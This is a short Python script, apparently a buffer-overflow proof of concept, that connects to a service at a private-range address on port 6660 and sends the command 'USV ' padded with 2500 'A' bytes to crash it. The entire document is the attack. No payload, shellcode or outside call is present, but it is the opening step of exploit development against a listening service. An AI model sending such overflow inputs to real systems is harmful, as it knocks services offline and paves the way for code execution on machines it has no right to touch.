#!/usr/bin/python
import socket

target_address="172.16.73.130"
target_port=6660

buffer = "USV " + "\x41" * 2500 + "\r\n\r\n"

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer)
sock.close()